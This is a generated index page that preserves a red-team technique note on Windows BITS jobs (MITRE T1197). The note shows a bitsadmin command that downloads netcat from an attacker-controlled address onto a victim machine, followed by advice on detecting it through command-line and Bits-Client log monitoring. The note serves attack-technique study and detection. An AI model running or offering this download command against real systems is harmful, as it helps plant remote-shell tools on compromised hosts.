---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# BITS Jobs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1197-bits-jobs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1197-bits-jobs.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [BITS Jobs](../../topics/offensive-security/bits-jobs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1197-bits-jobs |
| name | BITS Jobs |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1197-bits-jobs.md |

## Preserved Source Material

````yaml
_asset_filenames:
- bits-cmdline.png
- bits-download.png
- bits-operational-logs.png
_body: '---

  description: File upload to the compromised system.

  ---


  # BITS Jobs


  ## Execution


  {% code title="attacker@victim" %}

  ```c

  bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe

  ```

  {% endcode %}


  ![](../../.gitbook/assets/bits-download.png)


  ## Observations


  Commandline arguments monitoring can help discover bitsadmin usage:


  ![](../../.gitbook/assets/bits-cmdline.png)


  `Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor
  as well. An example of one of the jobs:


  ![](../../.gitbook/assets/bits-operational-logs.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1197" %}'
_relative_path: offensive-security/persistence/t1197-bits-jobs.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1197-bits-jobs.md
````
